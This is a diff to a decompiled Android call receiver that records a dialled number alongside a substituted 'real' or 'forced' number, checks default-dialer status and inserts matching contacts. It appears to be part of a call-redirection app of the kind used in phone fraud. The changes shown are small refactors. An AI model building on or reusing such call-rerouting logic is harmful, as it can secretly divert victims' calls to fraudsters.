@@ -72,8 +72,10 @@ public class TelePhoneReceiver extends BroadcastReceiver {
         lastRequestDialerTime = 0L;
     }
 
+
+
     public TelePhoneReceiver() {
-        System.out.println("demo........");
+        System.out.println("TelePhoneReceiver init........");
     }
 
     public static String access$000(TelePhoneReceiver this$0) {
@@ -230,12 +232,11 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                         {
                             if (forwarding == null) {
                                 this.savedNumberReal = null;
-
                                 break ;
                             }
                             this.savedNumberReal = forwarding.getRealPhoneNumber();
+                            TelePhoneReceiver.mCallLogBean = new CallLogBean(savedNumber, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                             if (forwarding.getSpecial() != 1) {
-                                TelePhoneReceiver.mCallLogBean = new CallLogBean(savedNumber, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                                 break ;
                             }
                             final boolean b = true;
@@ -434,7 +435,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             this.savedNumberReal = forced;
 //-^-                             SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA"), string3);
                             SharedPreferencesUtils.putValue("KEY_FORCED_PHONE", string3);
-                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, this.savedNumberReal, "forced", System.currentTimeMillis());
+                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, this.savedNumberReal, Constants.CALL_SOURCE_FORCED, System.currentTimeMillis());
                             boolean actionStart;
                             if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                                 ContentUtils.insertContacts(context, this.savedNumberReal, string3);
